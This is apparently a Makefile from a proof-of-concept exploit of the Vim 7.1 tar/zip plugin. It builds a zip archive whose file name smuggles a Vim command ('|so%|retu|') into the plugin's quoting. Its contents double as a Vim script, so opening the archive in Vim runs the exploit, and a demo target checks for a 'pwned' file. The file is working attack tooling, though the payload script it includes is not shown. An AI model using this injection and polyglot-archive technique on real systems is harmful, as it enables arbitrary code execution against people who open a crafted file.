# Makefile for rdancer's exploit of the vim 7.1 tar plugin
#
# There are two interested targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    This is the default target.  Runs ``make sploit'', adds contents to
#	    the exploit tarball, and opens it in vim (thereby running the
#	    exploit)

#
# Variables
#

# The name of the compiled exploit.  The single quotes are there to finish and
# restart the quoting in the script we're exploiting.  INITIAL and FINAL are
# variable within limits
INITIAL = "foo"
FINAL = "bar"
ARCHIVE_NAME = "sploit/$(INITIAL)'|so%|retu|'$(FINAL).zip"

# Necessary when ARCHIVE_NAME contains colons
ZIP_OPTIONS = -n txt

# Name of the principal archive member that contains the exploit itself
# This file name are the very first characters of the tarball file, so let it
# be a comment introduction
MEMBER_NAME = "foo.txt"

# Random string we use in names to prevent name collision
export MAGIC := $(shell env LANG=C LC_CTYPE=C LC_ALL=C tr -dc 'A-Za-z' \
		< /dev/urandom | head -c 16)
# Make it static if we're short on randomness
#export MAGIC = "wMkcvujyyXckKeLq"

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16

# Use this file's contents to ammend the exploit tarball
ARCHIVED_FILES ?= licenses/*

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

# We need a legit zip archive to test the version of the zip.vim file Vim is using
DUMMY_ARCHIVE_NAME=foo.zip
DUMMY_ARCHIVE_CONTENTS=licenses/*

#
# Targets
#

# Open the exploit in vim
.PHONY: demo
demo: sploit
	rm -f -- $(PWN_FILE)
	vim $(VIM_OPTIONS) -- $(ARCHIVE_NAME)
	if test -f $(PWN_FILE); then \
		echo "Exploit worked: we're pwned"; \
	else \
		echo "Exploit didn't work"; \
	fi


# Open the exploit in vim
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} +:q
test: demo

# Compile the exploit
.PHONY: sploit
sploit: exploit.vim plugin
	rm -f $(MEMBER_NAME)
	# This newline will go right after the NUL padding -- otherwise the
	# first line of the script would be part of the initial comment.
	echo > $(MEMBER_NAME)
	# Expand all occurrences of VERY_MAGIC
	sed "s#VERY_MAGIC#$(MAGIC)#g" < exploit.vim >> $(MEMBER_NAME)
	# Append the redefinition of the zip plugin
	cat plugin/zip.vim.ready       >> $(MEMBER_NAME)
	echo                           >> $(MEMBER_NAME)
	cat plugin/zipPlugin.vim.ready >> $(MEMBER_NAME)
	# Make vim ignore rest of file (even utter garbage)
	echo -e '\nfinish'             >> $(MEMBER_NAME)
	# Create the archive/vim script
	rm -f -- $(ARCHIVE_NAME)
	mkdir -p sploit
	zip $(ZIP_OPTIONS) $(ARCHIVE_NAME) $(MEMBER_NAME) >/dev/null
	zip $(ZIP_OPTIONS) -g $(ARCHIVE_NAME) $(ARCHIVED_FILES) >/dev/null
ifeq (invalid,${EXPLOIT_ZIP_INVALID})
	sed -i '1s/./"/' -- $(ARCHIVE_NAME)
endif
	rm -f -- exploit
	ln -s -- $(ARCHIVE_NAME) exploit

#
# Following targets aren't of interest on their own
#

# Remove files we can make
.PHONY: clean
clean:
	rm -f -- $(ARCHIVE_NAME)
	rm -f -- $(MEMBER_NAME)
	rm -f -- $(PWN_FILE)
	rm -f -- exploit
	rm -f -- zipvim_version
	rm -f -- $(DUMMY_ARCHIVE_NAME)
	make -C plugin clean

.PHONY: test_magic
test_magic: 
	echo $(MAGIC)

# zipvim_version -- Store the zip.vim version number in the ``zipvim_version'' file
# Note: Has to be .PHONY, because the Vim version can change in-between runs
.PHONY: zipvim_version
zipvim_version:
	zip $(DUMMY_ARCHIVE_NAME) $(DUMMY_ARCHIVE_CONTENTS) >/dev/null
	#ex $(DUMMY_ARCHIVE_NAME) +':echo g:loaded_zip' +:q > zipvim_version
	ex $(DUMMY_ARCHIVE_NAME) \
			+':exe "!printf \\%s\\\\n " . shellescape (g:loaded_zip) . " > zipvim_version"' \
			+:q >/dev/null 2>&1

# zipvim_version_print -- Print zip.vim version number
.PHONY: zipvim_version_print
zipvim_version_print: zipvim_version
	cat zipvim_version

.PHONY: plugin
plugin:
	make -C plugin
